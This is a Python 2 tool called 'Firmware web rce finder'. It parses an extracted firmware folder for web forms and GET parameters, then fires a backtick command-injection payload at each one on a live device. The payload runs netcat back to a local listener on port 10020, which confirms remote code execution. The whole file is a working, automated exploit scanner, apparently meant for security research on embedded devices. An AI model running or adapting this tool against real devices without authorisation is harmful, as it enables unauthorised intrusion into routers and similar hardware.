#!/usr/bin/python
# -*- coding: utf-8  -*-

import argparse
import fnmatch
import os
import sys
import re
import socket
import urllib
import string
import requests
from bs4 import BeautifulSoup


class FirmwareParser(object):
    """ Parse firmware folder to find obvious rce
    """

    def __init__(self, base_folder=None, remote_address=None, local_address=None, cookies=None):
        """ Load base data and set payload
        """
        self.base_folder = base_folder
        self.remote_address = remote_address
        self.cookies = {}
        if cookies is not None:
            cookies_split = cookies.split("&")
            c_parsed = [c.split("=") for c in cookies_split]
            for cookie in c_parsed:
                self.cookies[cookie[0]] = cookie[1]

        self.local_address = local_address
        self.payload = "`echo\t1|nc\t{}\t10020`".format(self.local_address)

    def search_files(self):
        """ Search all web files
        """
        extensions = (".htm",".html",".cgi",
                      ".inc", ".asp", ".php",
                      ".jsp",)
        matches = []
        for root, dirnames, filenames in os.walk(self.base_folder):
            for filename in [f for f in filenames if f.endswith(extensions)]:
                matches.append(os.path.join(root, filename))
        return matches

    def search_inputs(self, files):
        """ Search inputs in files
        """
        inputs = []
        for file in files:
            try:
                with open(file, 'r') as fd_file:
                    file_content = fd_file.read()
                    if not all(c in string.printable for c in file_content):
                        continue
                    for input in self._search_get_input(file_content, file):
                        inputs.append(input)
                    for input in self._search_form_input(file_content, file):
                        inputs.append(input)
            except IOError:
                # Silently pass
                pass
        return inputs

    def _search_get_input(self, file_content, filename):
        """ Search for GET links
        """
        regex = r'([a-zA-Z-0-9_\.=\/-]+\?.+)'
        matchs = re.findall( regex, file_content, re.M|re.I)
        args_parsed = []
        if len(matchs) > 0:
            for match in matchs:
                match = match.split("?", 1)
                file = match[0]
                if "PHP_SELF" in file or "#" == file:
                    file = os.path.basename(filename)
                args_xpld = match[1].split("&")
                for arg in args_xpld:
                    if "=" in arg:
                        new_arg = {"name": arg.split("=", 1)[0], "value": "\033[91m{PAYLOAD}\033[0m"}
                        if new_arg not in args_parsed:
                            args_parsed.append(new_arg)

                        yield {"dst_file": file,
                               "method": "GET",
                               "args": args_parsed}

    def _search_form_input(self, file_content, filename):
        """ Search for form data
        """
        html_proc = BeautifulSoup(file_content)
        forms = html_proc.findAll("form")
        for form in forms:
            dst_file = form.get('action')
            if dst_file is None or "PHP_SELF" in dst_file or "#" == dst_file:
                dst_file = os.path.basename(filename)
            method = form.get('method')
            if method is None:
                method = "GET"
            args = []
            inputs = form.findAll("input")
            for input in inputs:
                if input.get("name") is not None:
                    args.append({"name": input.get("name"), "value": "\033[91m{PAYLOAD}\033[0m"})
            yield {"dst_file":dst_file, "method": method.upper(), "args":args}

    def clean_inputs(self, inputs):
        """ Clean inputs
        """
        inputs_uniq = []
        for input in inputs:
            if input not in inputs_uniq and input["dst_file"] is not None:
                if all(c in string.printable for c in input["dst_file"]):
                    inputs_uniq.append(input)

        final_inputs = []
        for input in inputs_uniq:
            input["dst_file"] = "http://{}/{}".format(self.remote_address, 
                                                      input["dst_file"])
            if len(input["args"]) > 0:
                final_inputs.append(input)
        return final_inputs

    def check_rce(self, inputs):
        """ Try to attack remote machine and check exploit
        """
        for input in inputs:
            s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 10020))
            s.settimeout(1)
            s.listen(1)
            success = False

            payload = {}
            for arg in input["args"]:
                payload[arg["name"]] = self.payload

            try:
                if input["method"].upper() == "GET":
                    req = requests.request(input["method"],
                                           url=input["dst_file"],
                                           cookies=self.cookies,
                                           timeout=1,
                                           params=payload)
                else:
                    req = requests.request(input["method"],
                                           url=input["dst_file"],
                                           cookies=self.cookies,
                                           timeout=1,
                                           data=payload)
            except requests.exceptions.ReadTimeout:
                pass
            try:
                s.accept()
                success = True
            except socket.timeout:
                pass
            yield (input, success)
            s.close()

    def test_server(self):
        """ Start a listening server on port 10020 for tests
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 10020))
        s.settimeout(10)
        s.listen(1)
        try:
            while True:
                try:
                    s.accept()
                    print "\033[92mSUCCESS\033[0m"
                except socket.timeout:
                    pass
        except Exception, e:
            s.close()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Firmware web rce finder')
    parser.add_argument('-s', '--server',
                        action='store_true',
                        dest='server',
                        required=False,
                        help='run test server only for manual tests')
    parser.add_argument('-f', '--folder',
                        action='store',
                        dest='base_folder',
                        required=False,
                        help='base folder of the extracted firmware')
    parser.add_argument('-r', '--remote',
                        action='store',
                        dest='remote_address',
                        default="{TARGET}",
                        help='Address of live machine (like 192.168.0.1)')
    parser.add_argument('-l', '--local',
                        action='store',
                        dest='local_address',
                        default="127.0.0.1",
                        help='Address of this machine (like 192.168.0.1)')
    parser.add_argument('-c', '--cookies',
                        action='store',
                        dest='cookies',
                        default=None,
                        help='Use cookies for authenticated parts')
    parser.add_argument('-v', '--verbose',
                        action='store_true',
                        dest='verbose',
                        default=False,
                        help='Verbose mode')

    args = parser.parse_args()

    if not args.server and not args.base_folder:
        print "You must choose between -s (test server) and -f (firmware folder)"
        sys.exit(0)

    if args.server:
        firmware_parser = FirmwareParser(local_address = args.local_address)
        print "\033[92m --- Firmware web rce finder ---  \033[0m"
        print "\033[92m ---    Server test mode     ---  \033[0m"
        print "\033[93mUse this payload : {}\033[0m".format(urllib.quote_plus(firmware_parser.payload))
        print "\033[93mServer is listening on port 10020...\033[0m"
        firmware_parser.test_server()
    else:
        if args.verbose:
            print "\033[92m --- Firmware web rce finder ---  \033[0m"

        firmware_parser = FirmwareParser(args.base_folder,
                                         args.remote_address,
                                         args.local_address,
                                         args.cookies)
        if args.verbose:
            print "\033[93mSearch files\033[0m"
        files = firmware_parser.search_files()

        if args.verbose:
            print "\033[93mSearch input\033[0m"
        inputs = firmware_parser.search_inputs(files)

        if args.verbose:
            print "\033[93mClean inputs\033[0m"
        payloaded_inputs = firmware_parser.clean_inputs(inputs)

        if "{TARGET}" in firmware_parser.remote_address or args.verbose:
            if "{TARGET}" in firmware_parser.remote_address:
                print "\033[93mCan't run tests, printing payload for manual testing\033[0m"
            for input in payloaded_inputs:
                args_string = ""
                for arg in input["args"]:
                    args_string = "{}{}={}&".format(args_string,
                                                    arg["name"],
                                                    arg["value"])
                if input["dst_file"] is not None:
                    print "- \033[94m({})\033[0m {} : {}".format(input["method"],
                                                                 input["dst_file"],
                                                                 args_string[:-1])
        if "{TARGET}" not in firmware_parser.remote_address:
            print "\033[93mRun tests :\033[0m"
            for input, success in firmware_parser.check_rce(payloaded_inputs):
                args_string = ""
                for arg in input["args"]:
                    args_string = "{}{}=\033[91m{}\033[0m&".format(args_string,
                                                    arg["name"],
                                                    urllib.quote_plus(firmware_parser.payload))
                result = "\033[92mSUCCESS\033[0m" if success else "\033[91mFAIL\033[0m"
                print "- {} : \033[94m({})\033[0m {} : {}".format(result,
                                                                  input["method"],
                                                                  input["dst_file"],
                                                                  args_string[:-1])

        if args.verbose:
            print "\033[93mFinish\033[0m"
